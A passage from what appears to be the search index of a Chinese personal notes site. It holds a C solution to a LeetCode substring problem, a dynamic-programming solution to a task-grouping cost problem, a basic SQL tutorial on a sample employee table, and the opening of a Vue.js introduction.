<p>\u53ef\u4ee5\u6362\u4e2a\u601d\u8def\uff0c<code>store</code> \u8868\u4e2d\u5b58\u7684\u4e0d\u662f index \uff0c\u800c\u662f\u8be5\u5143\u7d20\u51fa\u73b0\u7684\u6b21\u6570\uff1b\u4f7f\u7528 <code>start</code> \u548c <code>end</code> \u7ef4\u62a4\u5b50\u4e32\u7684\u5f00\u59cb\u548c\u7ed3\u675f\u4f4d\u7f6e\uff1a</p> <pre><code>int lengthOfLongestSubstring(char* s) {\n    int store[128];\n    int length = 0, maxlength = 0;\n    int start = 0, end = 0;\n    memset(store,0,sizeof(store));\n    for(;end&lt;strlen(s);++end){\n        ++ store[(int)s[end]];\n        ++ length;\n        while(store[s[end]] &gt; 1){\n            -- store[s[start++]];\n            -- length;\n        }\n        maxlength = (maxlength &gt; length)?maxlength:length;\n    }return (maxlength &gt; length)?maxlength:length;\n}\n</code></pre> <p>\u6211\u4e5f\u4e0d\u6e05\u695a\u4e3a\u4ec0\u4e48\uff0c\u603b\u4e4b\u6d88\u8017\u4e00\u4e0b\u5b50\u964d\u4e0b\u6765\u4e86\uff01</p> <p>\u5176\u5b9e\u662f\u6027\u80fd\u6740\u624b <code>memset</code> \u641e\u7684\u9b3c\uff01 (985ms -&gt; 12ms)</p>"},{"location":"Accumulation/Leetcode%E5%88%B7%E9%A2%98/#35-manager-of-tasks","title":"3.5 Manager of Tasks","text":"<p>\u5176\u5b9e\u662f ADS \u6a21\u62df\u5377\u91cc\u7684\u4e00\u4e2a\u9898\uff08\uff09</p> <p>There are N tasks arranged in a sequence on a machine waiting to be executed, and their order cannot be changed. You need to divide these N tasks into several groups, each containing several consecutive tasks. Starting from time 0, the tasks are processed in groups, and the time required to execute the i-th task is Ti\u200b. Additionally, the machine requires a startup time S before each group of tasks begins, so the time required for a group of tasks is the startup time S plus the sum of the time required for each task in this group.</p> <p>After a task is executed, it will wait briefly in the machine until all tasks in that group are completely executed. That is to say, the tasks in the same group will be completed at the same time. The cost of each task is its completion time multiplied by a cost coefficient Ci.</p> <p>Please plan a grouping scheme for the machine to minimize the total cost.</p> <p>For all testing data, 1\u2264N\u22641000,0\u2264S\u226450,1\u2264Ti\u200b,Ci\u200b\u2264100</p> <p>\u7b80\u5355\u6765\u8bb2\u5c31\u662f\u6709\u4e00\u4e2a\u957f\u5ea6\u4e3a N \u3001\u5148\u540e\u5173\u7cfb\u8981\u6c42\u4e0d\u53d8\u7684 Task \u5e8f\u5217\uff0c\u8981\u5206\u914d\u5728\u4e00\u4e2a\u5904\u7406\u5668\u4e0a\u6267\u884c\u3002\u5904\u7406\u5668\u53ef\u4ee5\u5c06\u8fd9\u4e9b Task \u5206\u6210\u4e0d\u540c\u957f\u5ea6 group\uff0c\u540c\u4e00 group \u5185\u7684 Task \u540c\u65f6\u5b8c\u6210\uff0c\u4e14\u5b8c\u6210\u65f6\u95f4\u7b49\u4e8e\u8fd9\u4e9b Task \u6240\u9700\u7684\u65f6\u95f4\u548c\u5e76\u52a0\u4e0a\u4e00\u4e2a Setup Time(S)\uff1b\u800c\u540e\u9762\u7684\u7ec4\u7684\u65f6\u95f4\u8ba1\u7b97\u8981\u4ece\u524d\u4e00\u4e2a\u7ec4\u7684\u672b\u5c3e\u5f00\u59cb\u3002\u6c42\u8fd9\u7ec4\u4efb\u52a1\u6700\u5c11\u7684 Cost\u3002</p> <pre><code>Sample input:\n5\n1\n1 3\n3 2\n4 3\n2 3\n1 4\n\nSample Output:\n153\n\nSample Explanation:\nWe have grouped the tasks into 3 groups, which are `{1, 2}, {3}, {4, 5}`. The completion time corresponding to each task, in the order of the task numbers, is `{5, 5, 10, 14, 14}`. Similarly, the cost corresponding to each task, again in the order of the task numbers, is `{15, 10, 30, 42, 56}`. The total cost of these tasks is 153.\n</code></pre> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;limits.h&gt;\n\n#define MAXN 1000\n\nlong long min_cost(int N, int S, int T[], int C[]);\n\nint main() {\n    int N, S;\n    int T[MAXN], C[MAXN];\n    scanf(\"%d%d\", &amp;N, &amp;S);\n    for (int i = 0;i &lt; N; ++ i) {\n        scanf(\"%d%d\", &amp;T[i], &amp;C[i]);\n    }\n    printf(\"%lld\\n\", min_cost(N, S, T, C));\n    return 0;\n}\n\nlong long min_cost(int N, int S, int T[], int C[]) {\n    long long dp[MAXN + 1];\n    long long dptime[MAXN + 1] = {0};\n    long long sumT[MAXN + 1] = {0}; // \u524d\u7f00\u548c\uff1a\u4efb\u52a1\u6267\u884c\u65f6\u95f4\n    long long sumC[MAXN + 1] = {0}; // \u524d\u7f00\u548c\uff1a\u6210\u672c\u7cfb\u6570\n\n    // \u8ba1\u7b97\u524d\u7f00\u548c\n    for (int i = 1; i &lt;= N; i++) {\n        sumT[i] = sumT[i - 1] + T[i - 1];\n        sumC[i] = sumC[i - 1] + C[i - 1];\n    }\n\n    // \u521d\u59cb\u5316 dp \u6570\u7ec4\n    dp[0] = 0; // 0 \u4e2a\u4efb\u52a1\u7684\u6210\u672c\u4e3a 0\n    for (int i = 1; i &lt;= N; i++) {\n        dp[i] = LLONG_MAX;\n    }\n\n    // \u52a8\u6001\u89c4\u5212\u6c42\u89e3\n    for (int i = 1; i &lt;= N; i++) {\n        for (int j = 1; j &lt;= i; j++) {\n            // \u4ee5 j \u4e3a\u8d77\u70b9\uff0ci \u4e3a\u7ec8\u70b9\u7684\u4efb\u52a1\u7ec4\n            long long group_time = S + (sumT[i] - sumT[j - 1]) + dptime[j - 1];\n            long long group_cost = (sumC[i] - sumC[j - 1]) * group_time;\n\n            // \u66f4\u65b0 dp[i]\n            if( dp[i] + dptime[i] * (sumC[N] - sumC[i]) &gt; dp[j - 1] + group_cost + group_time * (sumC[N] - sumC[i]))\n            {\n                dp[i] = dp[j - 1] + group_cost;\n                dptime[i] = group_time;\n            }\n        }\n    }\n\n    return dp[N];\n}\n</code></pre> <p>\u5176\u5b9e\u56f0\u4f4f\u6211\u7684\u96be\u70b9\u5728\u4e8e <code>dp[i] + dptime[i] * (sumC[N] - sumC[i]) &gt; dp[j - 1] + group_cost + group_time * (sumC[N] - sumC[i])</code> \u8fd9\u53e5\u5224\u65ad\u6761\u4ef6\u7684\u786e\u5b9a\u3002\u4e00\u5f00\u59cb\u6ca1\u80fd\u6ce8\u610f\u5230\uff0c\u5982\u679c\u6761\u4ef6\u4ec5\u8bbe\u4e3a <code>dp[i] &gt; dp[j-1] + group_cost</code> \u7684\u8bdd\uff0c\u8be5\u7b97\u6cd5\u4f1a\u5c06\u6bcf\u4e00\u4e2a Task \u90fd\u5355\u72ec\u8bbe\u7f6e\u6210\u4e00\u4e2a Group\uff0c\u4ece\u800c\u9677\u5165\u4e86\u5c40\u90e8\u6700\u4f18\u89e3\u7684\u9677\u9631\uff01\u56e0\u6b64\u6211\u4eec\u8981\u9ad8\u77bb\u8fdc\u77a9\uff0c\u8003\u8651\u591a\u4e2a Group \u5e26\u6765\u7684 Setup Time \u5bf9\u540e\u9762\u7684\u7ec4\u522b\u7684 Cost \u7684\u5f71\u54cd\u3002</p>"},{"location":"Accumulation/SQL/","title":"SQL","text":""},{"location":"Accumulation/SQL/#sql","title":"SQL","text":"<p> \u7ea6 409 \u4e2a\u5b57  226 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>Structured Query Language \u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00</p> <p>SQL \u662f\u7528\u4e8e\u8bbf\u95ee\u548c\u5904\u7406\u6570\u636e\u5e93\u7684\u6807\u51c6\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\u3002</p>"},{"location":"Accumulation/SQL/#_1","title":"\u57fa\u7840\u8bed\u6cd5","text":""},{"location":"Accumulation/SQL/#select","title":"SELECT","text":"<pre><code>SELECT column1, column2, ... FROM table_name;\n\nSELECT * FROM table_name (where Condition);\n</code></pre> <ul> <li>\u53c2\u6570\u8bf4\u660e<ul> <li>column1, column2, ...\uff1a\u8981\u9009\u62e9\u7684\u5b57\u6bb5\u540d\u79f0\uff0c\u53ef\u4ee5\u4e3a\u591a\u4e2a\u5b57\u6bb5\u3002\u5982\u679c\u4e0d\u6307\u5b9a\u5b57\u6bb5\u540d\u79f0\uff0c\u5219\u4f1a\u9009\u62e9\u6240\u6709\u5b57\u6bb5\u3002</li> <li>table_name\uff1a\u8981\u67e5\u8be2\u7684\u8868\u540d\u79f0\u3002</li> <li>Condition:\u7b5b\u9009\u6ee1\u8db3\u6761\u4ef6\u7684\u8bb0\u5f55<ul> <li>\u6ce8\u610f\uff0cSQL\u4e2d\u91c7\u7528\u5355\u5f15\u53f7\u73af\u7ed5\u6587\u672c\u503c (\u5927\u90e8\u5206\u6570\u636e\u5e93\u4e5f\u63a5\u53d7\u53cc\u5f15\u53f7)</li> <li>Condition\u4e2d\u8fd8\u652f\u6301 not,and,or \u7b49\u903b\u8f91\u8fd0\u7b97</li> <li>\u7279\u6b8a\u6761\u4ef6<ul> <li>is NULL <code>Select * from emp where comm is null;</code></li> <li>between and  <code>Select * from emp where sal between 1500 and 3000;</code> \u5305\u542b\u4e0a\u4e0b\u9650</li> <li>in <code>Select * from emp where sal in (5000,3000,1500);</code></li> <li>like \u6a21\u7cca\u67e5\u8be2 <code>Select * from emp where ename like 'M%';</code><ul> <li>\u540e\u9762\u63a5\u7c7b\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c%\u00a0\u8868\u793a\u591a\u4e2a\u5b57\u503c\uff0c_\u00a0\u4e0b\u5212\u7ebf\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff1b</li> <li>M%\u00a0: \u4e3a\u80fd\u914d\u7b26\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u7684\u610f\u601d\u4e3a\u6a21\u7cca\u67e5\u8be2\u4fe1\u606f\u4e3a M \u5f00\u5934\u7684\u3002</li> <li>%M%\u00a0: \u8868\u793a\u67e5\u8be2\u5305\u542bM\u7684\u6240\u6709\u5185\u5bb9\u3002</li> <li>%M_\u00a0: \u8868\u793a\u67e5\u8be2\u4ee5M\u5728\u5012\u6570\u7b2c\u4e8c\u4f4d\u7684\u6240\u6709\u5185\u5bb9\u3002</li> </ul> </li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>\u6f14\u793a\u5982\u4e0b </p><pre><code>-- create\nCREATE TABLE EMPLOYEE (\n  empId INTEGER PRIMARY KEY,\n  name TEXT NOT NULL,\n  dept TEXT NOT NULL\n);\n\n-- insert\nINSERT INTO EMPLOYEE VALUES (0001, 'Clark', 'Sales');\nINSERT INTO EMPLOYEE VALUES (0002, 'Dave', 'Accounting');\nINSERT INTO EMPLOYEE VALUES (0003, 'Ava', 'Sales');\nINSERT INTO EMPLOYEE VALUES (0004, 'Ava', 'Sales');\nINSERT INTO EMPLOYEE VALUES (0005, 'Ava', 'Accounting');\nINSERT INTO EMPLOYEE VALUES (0006, 'Ava', 'Sales');\nINSERT INTO EMPLOYEE VALUES (0007, 'Ava', 'Sales');\nINSERT INTO EMPLOYEE VALUES (0008, 'Dave', 'Accounting');\nINSERT INTO EMPLOYEE VALUES (0009, 'Nimisora', 'Accounting');\n\n-- fetch \nSELECT * FROM EMPLOYEE;\n\nSELECT * FROM EMPLOYEE WHERE dept = 'Sales' and empID &gt;5;\n\nSELECT name,dept FROM EMPLOYEE;\n\n-- Output\n\n+-------+----------+------------+\n| empId | name     | dept       |\n+-------+----------+------------+\n|     1 | Clark    | Sales      |\n|     2 | Dave     | Accounting |\n|     3 | Ava      | Sales      |\n|     4 | Ava      | Sales      |\n|     5 | Ava      | Accounting |\n|     6 | Ava      | Sales      |\n|     7 | Ava      | Sales      |\n|     8 | Dave     | Accounting |\n|     9 | Nimisora | Accounting |\n+-------+----------+------------+\n+-------+------+-------+\n| empId | name | dept  |\n+-------+------+-------+\n|     6 | Ava  | Sales |\n|     7 | Ava  | Sales |\n+-------+------+-------+\n+----------+------------+\n| name     | dept       |\n+----------+------------+\n| Clark    | Sales      |\n| Dave     | Accounting |\n| Ava      | Sales      |\n| Ava      | Sales      |\n| Ava      | Accounting |\n| Ava      | Sales      |\n| Ava      | Sales      |\n| Dave     | Accounting |\n| Nimisora | Accounting |\n+----------+------------+\n</code></pre> <ul> <li><code>SELECT DINSTINCT</code> \u7528\u4e8e\u8fd4\u56de\u552f\u4e00\u4e0d\u540c\u7684\u503c\uff0c\u5373\u53bb\u6389\u91cd\u590d\u503c</li> </ul> <p>\u6f14\u793a\u5982\u4e0b </p><pre><code>-- \u540c\u4e00\u4e2a Table \u4e0d\u518d\u91cd\u590d\n\n-- fetch \nSELECT * FROM EMPLOYEE;\n\nSELECT DISTINCT name FROM EMPLOYEE;\n\nSELECT DISTINCT dept FROM EMPLOYEE;\n\n-- Output\n\n+-------+----------+------------+\n| empId | name     | dept       |\n+-------+----------+------------+\n|     1 | Clark    | Sales      |\n|     2 | Dave     | Accounting |\n|     3 | Ava      | Sales      |\n|     4 | Ava      | Sales      |\n|     5 | Ava      | Accounting |\n|     6 | Ava      | Sales      |\n|     7 | Ava      | Sales      |\n|     8 | Dave     | Accounting |\n|     9 | Nimisora | Accounting |\n+-------+----------+------------+\n+----------+\n| name     |\n+----------+\n| Clark    |\n| Dave     |\n| Ava      |\n| Nimisora |\n+----------+\n+------------+\n| dept       |\n+------------+\n| Sales      |\n| Accounting |\n+------------+\n</code></pre> <ul> <li><code>ORDER BY column1 , column2 (ASC|DESC)</code>  \u7528\u4e8e\u5bf9\u7ed3\u679c\u96c6\u8fdb\u884c\u6392\u5e8f\uff0c\u9ed8\u8ba4\u5347\u5e8f</li> </ul> <p>\u6f14\u793a\u5982\u4e0b </p><pre><code>-- \u540c\u4e00\u4e2a Table \u4e0d\u518d\u91cd\u590d\n\n-- fetch \nSELECT * FROM EMPLOYEE;\n\nSELECT * FROM EMPLOYEE WHERE dept = 'Sales' order by name;\n\nSELECT * FROM EMPLOYEE order by empId desc;\n\n-- Output\n\n+-------+----------+------------+\n| empId | name     | dept       |\n+-------+----------+------------+\n|     1 | Clark    | Sales      |\n|     2 | Dave     | Accounting |\n|     3 | Ava      | Sales      |\n|     4 | Ava      | Sales      |\n|     5 | Ava      | Accounting |\n|     6 | Ava      | Sales      |\n|     7 | Ava      | Sales      |\n|     8 | Dave     | Accounting |\n|     9 | Nimisora | Accounting |\n+-------+----------+------------+\n+-------+-------+-------+\n| empId | name  | dept  |\n+-------+-------+-------+\n|     3 | Ava   | Sales |\n|     4 | Ava   | Sales |\n|     6 | Ava   | Sales |\n|     7 | Ava   | Sales |\n|     1 | Clark | Sales |\n+-------+-------+-------+\n+-------+----------+------------+\n| empId | name     | dept       |\n+-------+----------+------------+\n|     9 | Nimisora | Accounting |\n|     8 | Dave     | Accounting |\n|     7 | Ava      | Sales      |\n|     6 | Ava      | Sales      |\n|     5 | Ava      | Accounting |\n|     4 | Ava      | Sales      |\n|     3 | Ava      | Sales      |\n|     2 | Dave     | Accounting |\n|     1 | Clark    | Sales      |\n+-------+----------+------------+\n</code></pre>"},{"location":"Accumulation/SQL/#insert","title":"INSERT","text":"<pre><code>INSERT INTO table_name (column1,column2,column3,...)\nVALUES (value1,value2,value3,...);\n</code></pre> <ul> <li>INSERT INTO \u8bed\u53e5\u7528\u4e8e\u5411\u8868\u4e2d\u63d2\u5165\u65b0\u8bb0\u5f55\u3002</li> <li>\u53c2\u6570\u8bf4\u660e<ul> <li>table_name\uff1a\u9700\u8981\u63d2\u5165\u65b0\u8bb0\u5f55\u7684\u8868\u540d\u3002</li> <li>column1, column2, ...\uff1a\u9700\u8981\u63d2\u5165\u7684\u5b57\u6bb5\u540d\uff0c\u53ef\u4ee5\u4e0d\u52a0</li> <li>value1, value2, ...\uff1a\u9700\u8981\u63d2\u5165\u7684\u5b57\u6bb5\u503c\u3002</li> </ul> </li> </ul>"},{"location":"Accumulation/SQL/#update","title":"UPDATE","text":"<pre><code>UPDATE table_name\nSET column1 = value1, column2 = value2, ...\nWHERE condition;\n</code></pre> <ul> <li>UPDATE \u7528\u4e8e\u66f4\u65b0\u8868\u4e2d\u8bb0\u5f55</li> </ul> <p>\u6f14\u793a\u5982\u4e0b </p><pre><code>-- \u540c\u4e00\u4e2a Table \u4e0d\u518d\u91cd\u590d\n\n-- fetch \nSELECT * FROM EMPLOYEE;\n\n-- Update\nupdate EMPLOYEE set dept = 'GirlFriend' where name = 'Nimisora';\n\n-- fetch again\nSELECT * FROM EMPLOYEE;\n\n-- Output\n\n+-------+----------+------------+\n| empId | name     | dept       |\n+-------+----------+------------+\n|     1 | Clark    | Sales      |\n|     2 | Dave     | Accounting |\n|     3 | Ava      | Sales      |\n|     4 | Ava      | Sales      |\n|     5 | Ava      | Accounting |\n|     6 | Ava      | Sales      |\n|     7 | Ava      | Sales      |\n|     8 | Dave     | Accounting |\n|     9 | Nimisora | Accounting |\n+-------+----------+------------+\n+-------+----------+------------+\n| empId | name     | dept       |\n+-------+----------+------------+\n|     1 | Clark    | Sales      |\n|     2 | Dave     | Accounting |\n|     3 | Ava      | Sales      |\n|     4 | Ava      | Sales      |\n|     5 | Ava      | Accounting |\n|     6 | Ava      | Sales      |\n|     7 | Ava      | Sales      |\n|     8 | Dave     | Accounting |\n|     9 | Nimisora | GirlFriend |\n+-------+----------+------------+\n</code></pre>"},{"location":"Accumulation/SQL/#delete","title":"DELETE","text":"<pre><code>DELETE FROM table_name\nWHERE condition;\n</code></pre> <ul> <li>DELETE \u7528\u4e8e\u5220\u9664\u8868\u4e2d\u7684\u884c</li> </ul> <p>\u6f14\u793a\u5982\u4e0b</p> <pre><code>-- \u540c\u4e00\u4e2a Table \u4e0d\u518d\u91cd\u590d\n\n-- fetch \nSELECT * FROM EMPLOYEE;\n\n-- Delete\ndelete from EMPLOYEE where dept = 'Sales';\n\n-- fetch again\nSELECT * FROM EMPLOYEE;\n\n-- Output\n\n+-------+----------+------------+\n| empId | name     | dept       |\n+-------+----------+------------+\n|     1 | Clark    | Sales      |\n|     2 | Dave     | Accounting |\n|     3 | Ava      | Sales      |\n|     4 | Ava      | Sales      |\n|     5 | Ava      | Accounting |\n|     6 | Ava      | Sales      |\n|     7 | Ava      | Sales      |\n|     8 | Dave     | Accounting |\n|     9 | Nimisora | Accounting |\n+-------+----------+------------+\n+-------+----------+------------+\n| empId | name     | dept       |\n+-------+----------+------------+\n|     2 | Dave     | Accounting |\n|     5 | Ava      | Accounting |\n|     8 | Dave     | Accounting |\n|     9 | Nimisora | Accounting |\n+-------+----------+------------+\n</code></pre>"},{"location":"Accumulation/SQL/#_2","title":"\u9ad8\u7ea7\u6559\u7a0b","text":"<p>\u6709\u9700\u8981\u518d\u8bf4\u5427</p>"},{"location":"Accumulation/Vue.js/","title":"Vue.js","text":""},{"location":"Accumulation/Vue.js/#vuejs","title":"Vue.js","text":"<p> \u7ea6 2017 \u4e2a\u5b57  431 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p> <p>Vue \u751f\u547d\u5468\u671f</p> <p></p>"},{"location":"Accumulation/Vue.js/#_1","title":"\u9879\u76ee\u7ed3\u6784","text":"<p>\u4e00\u4e2a\u6700\u57fa\u672c\u7684 Vue \u9879\u76ee\u7684\u7ed3\u6784\u5982\u56fe\uff1a</p> <pre><code>Vue_Project\n\u251c\u2500\u2500 build\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 ...\n\u251c\u2500\u2500 node_modules\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 ...\n\u251c\u2500\u2500 public\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 ...\n\u251c\u2500\u2500 src\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 ...\n\u251c\u2500\u2500 index.html\n\u251c\u2500\u2500 package.json\n\u2514\u2500\u2500 README.md\n</code></pre> \u76ee\u5f55/\u6587\u4ef6 \u8bf4\u660e build \u9879\u76ee\u6784\u5efa\uff0c<code>npm run build</code> node_modules npm \u52a0\u8f7d\u7684\u9879\u76ee\u4f9d\u8d56 src \u5f00\u53d1\u76ee\u5f55\uff0c\u5305\u542b\uff1a- assets\uff1a\u653e\u7f6e\u8d44\u6e90- components\uff1a\u653e\u7f6evue\u7ec4\u4ef6- App.vue\uff1a\u9879\u76ee\u5165\u53e3- main.js\uff1a\u9879\u76ee\u6838\u5fc3\u6587\u4ef6 index.html \u9996\u9875\u5165\u53e3\uff0c\u53ef\u6dfb\u52a0meta\u4fe1\u606f\u7b49 package.json \u9879\u76ee\u914d\u7f6e <p>vue \u4f9d\u8d56\u4e8e HTTP \u670d\u52a1\u5668\uff0c\u4e0d\u80fd\u901a\u8fc7 <code>file://</code> \u534f\u8bae\u5de5\u4f5c\uff0c\u56e0\u6b64\u4e00\u822c\u9700\u8981 <code>Node.js</code></p> <p>\u5bf9\u4e8e\u4e0a\u9762\u7684\u6587\u4ef6\u7ed3\u6784\uff0c\u521b\u5efa\u4e00\u4e2a vue \u5e94\u7528\u7684\u7b80\u5355\u793a\u4f8b\u5982\u4e0b\uff0c\u6211\u4eec\u901a\u8fc7 <code>createApp</code> \u6765\u6307\u5b9a\u64cd\u4f5c\u7684\u7ec4\u4ef6\uff1a</p> <pre><code>// main.js\nimport './assets/main.css'\nimport { createApp } from 'vue'\nimport App from './App.vue'\n\nconst app = createApp(App)\n\n// mount \u4ee3\u8868\u6e32\u67d3\u65f6\uff0c\u8be5\u53e5\u8868\u793a id=#app \u7684\u5757\u88ab\u6e32\u67d3\u65f6\uff0c\u66ff\u6362\u4e3a app \u7ec4\u4ef6\u5b9e\u4f8b\napp.mount('#app')\n</code></pre> <p>\u5bf9\u5e94\u7684 <code>index.html</code> \u5982\u4e0b\uff0c\u5176\u5c06 body \u90e8\u5206\u6e32\u67d3\u4e3a <code>App.vue</code> \u7684\u5185\u5bb9</p> <pre><code>&lt;!-- index.html --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;link rel=\"icon\" href=\"src/components/icons/logo.png\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;This is the title&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div id=\"app\"&gt;&lt;/div&gt;\n    &lt;script type=\"module\" src=\"/src/main.js\"&gt;&lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u6211\u4eec\u6682\u65f6\u53ea\u5173\u6ce8vue\u6587\u4ef6\u7684\u7ed3\u6784\uff0c\u5176\u5b83\u914d\u7f6e\u6587\u4ef6\u6709\u9700\u6c42\u65f6\u8bf7\u53bb\u5b98\u65b9\u6587\u6863\u4e2d\u770b\u3002</p> <p>\u5927\u591a\u6570\u9879\u76ee\u7684 vue \u6587\u4ef6\u7531 template\u3001script\u3001style \u4e09\u4e2a\u90e8\u5206\u7ec4\u6210\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u5176\u4e0e HTML\u3001JavaScript\u3001CSS \u4e00\u4e00\u5bf9\u5e94\uff0c\u5b83\u5c06\u4e00\u4e2a\u7ec4\u4ef6\u7684\u903b\u8f91\u3001\u6a21\u677f\u548c\u6837\u5f0f\u5c01\u88c5\u5728\u540c\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u56e0\u6b64\u79f0\u4e3a\u5355\u6587\u4ef6\u7ec4\u4ef6(Single-File Components, SFC)\uff1a</p> <pre><code>&lt;template&gt;\n  ...\n&lt;/template&gt;\n\n&lt;script&gt;\n  ...\n&lt;/script&gt;\n\n&lt;style&gt;\n  ...\n&lt;/style&gt;\n</code></pre>"},{"location":"Accumulation/Vue.js/#template","title":"Template","text":"<p>Vue \u4f7f\u7528\u4e00\u79cd\u57fa\u4e8e HTML \u7684\u6a21\u677f\u8bed\u6cd5\uff0c\u5b83\u80fd\u591f\u58f0\u660e\u5f0f\u7684\u5c06\u7ec4\u4ef6\u5b9e\u4f8b\u7684\u6570\u636e\u7ed1\u5b9a\u5230 DOM \u4e0a\u3002\u5e95\u5c42\u673a\u5236\u4e0a\uff0cVue \u4f1a\u5c06\u6a21\u677f\u7f16\u8bd1\u6210\u4f18\u5316\u7684 JavaScript \u4ee3\u7801\u3002</p> <p>DOM: Document Object Model\uff0c\u662f\u4e00\u4e2a\u7f51\u7edc\u6587\u6863\u7684\u7f16\u7a0b\u63a5\u53e3</p> <p>\u6587\u672c\u63d2\u503c</p> <p>\u6587\u672c\u63d2\u503c\u662f\u6700\u57fa\u672c\u7684\u6570\u636e\u7ed1\u5b9a\u5f62\u5f0f\uff0c\u4f7f\u7528\u53cc\u5927\u62ec\u53f7\u8bed\u6cd5\uff1a</p> <pre><code>&lt;span&gt;Message: {{ msg }}&lt;/span&gt;\n</code></pre> <p>\u53cc\u5927\u62ec\u53f7\u5185\u7684\u6807\u7b7e\u4f1a\u88ab\u66ff\u6362\u4e3a\u5bf9\u5e94\u7ec4\u4ef6\u5b9e\u4f8b\u4e2d\u7684 <code>msg</code> \u503c\uff0c\u6bcf\u6b21 <code>msg</code> \u5c5e\u6027\u66f4\u65b0\u65f6\uff0cHTML \u663e\u793a\u7684\u5185\u5bb9\u4e5f\u4f1a\u66f4\u65b0\u3002</p> <p>\u5982\u679c\u6211\u4eec\u60f3\u63d2\u5165\u4e00\u6bb5 HTML\uff0c\u5219\u9700\u8981\u4f7f\u7528 Vue \u7684 <code>v-html</code> \u5c5e\u6027\uff1a</p> <pre><code>&lt;p&gt;Using text interpolation: {{ rawHtml }}&lt;/p&gt;\n&lt;p&gt;Using v-html directive: &lt;span v-html=\"rawHtml\"&gt;&lt;/span&gt;&lt;/p&gt;\n\n&lt;!-- Mounted --&gt;\nUsing text interpolation: &lt;span style=\"color: red\"&gt;This should be red.&lt;/span&gt;\n</code></pre> <p>\u5176\u4e2d\u6587\u672c\u63d2\u503c\u5f97\u5230\u7684\u7ed3\u679c\u5982\u4e0a\uff0c\u800c <code>v-html</code> \u5219\u4f1a\u663e\u793a\u8be5\u6587\u5b57\u4e3a\u7ea2\u8272\u3002</p> <p>\u52a8\u6001\u6e32\u67d3\u4efb\u610f HTML \u975e\u5e38\u5371\u9669\uff0c\u8bf7\u4ec5\u5728\u5185\u5bb9\u5b89\u5168\u65f6\u518d\u4f7f\u7528 <code>v-html</code> \uff0c\u5e76\u4e0d\u8981\u4f7f\u7528\u7528\u6237\u63d0\u4f9b\u7684\u5185\u5bb9</p> <p>Attribute \u7ed1\u5b9a</p> <p>\u4e3a\u6807\u7b7e\u54cd\u5e94\u5f0f\u5730\u7ed1\u5b9a\u4e00\u4e2a attribute \u9700\u8981\u4f7f\u7528 <code>v-bind</code> \u6307\u4ee4\uff1a</p> <pre><code>&lt;div v-bind:id=\"dynamicId\"&gt;&lt;/div&gt;\n\n&lt;!-- \u7b80\u5199 --&gt;\n&lt;div :id=\"dynamicId\"&gt;&lt;/div&gt;\n</code></pre> <p>\u5982\u679c\u7ed1\u5b9a\u7684\u503c <code>dynamicId</code> \u4e3a <code>null</code> \u6216 <code>undefined</code>\uff0c\u5219\u8be5 attribute \u4f1a\u4ece\u6e32\u67d3\u7684\u5143\u7d20\u4e0a\u79fb\u9664\u3002</p> <p>\u540c\u540d\u7b80\u5199</p> <p>\u5728 Vue 3.4 \u7248\u672c\u4ee5\u4e0a\uff0c\u5982\u679c attribute \u540d\u79f0\u548c\u7ed1\u5b9a\u7684 JavaScript \u540d\u79f0\u76f8\u540c\uff0c\u5219\u53ef\u4ee5\u8fdb\u4e00\u6b65\u7b80\u5316\u8bed\u6cd5\uff1a</p> <pre><code>&lt;!-- \u7b49\u4ef7\u4e8e &lt;div :id=\"id\"&gt;&lt;/div&gt; --&gt;\n&lt;div :id&gt;&lt;/div&gt;\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u5728 JavaScript \u4e2d\u5b9a\u4e49\u4e86\u5982\u4e0b\u5305\u542b\u591a\u4e2a attribute \u5bf9\u8c61\u7684 JavaScript \u5bf9\u8c61\uff1a</p> <pre><code>data() {\n  return {\n    objectOfAttrs: {\n      id: 'container',\n      class: 'wrapper'\n    }\n  }\n}\n</code></pre> <p>\u90a3\u4e48\uff0c\u901a\u8fc7\u4e0d\u5e26\u53c2\u6570\u7684 <code>v-bind</code> \uff0c\u6211\u4eec\u53ef\u4ee5\u52a8\u6001\u7ed1\u5b9a\u591a\u4e2a\u5c5e\u6027\u503c\u5230\u5355\u4e2a\u5143\u7d20\u4e0a\uff1a</p> <pre><code>&lt;div v-bind=\"objectOfAttrs\"&gt;&lt;/div&gt;\n</code></pre> <p>v-on / @</p> <p>\u8fd9\u4e2a\u5c5e\u6027\u4e3a\u5143\u7d20\u7ed1\u5b9a\u4e00\u4e2a\u76d1\u542c\u5668\uff0c\u4e00\u822c\u8bed\u6cd5\u4e3a\uff1a</p> <pre><code>&lt;a v-on:event=\"doSomething\"&gt; ... &lt;/a&gt;\n\n&lt;!-- \u7b80\u5199 --&gt;\n&lt;a @event=\"doSomething\"&gt; ... &lt;/a&gt;\n</code></pre> <p>\u5e38\u7528\u7684 <code>event</code> \u6709 click\u3001focus\u3001submit \u7b49\u3002</p> <p>\u6309\u952e\u4fee\u9970\u7b26</p> <p>Vue \u5141\u8bb8\u76d1\u542c\u9f20\u6807\u548c\u952e\u76d8\u6309\u952e\u4e8b\u4ef6\uff1a</p> <pre><code>&lt;!-- \u4ec5\u5728 `key` \u4e3a `Enter` \u65f6\u8c03\u7528 `submit` --&gt;\n&lt;input @keyup.enter=\"submit\" /&gt;\n\n&lt;!-- 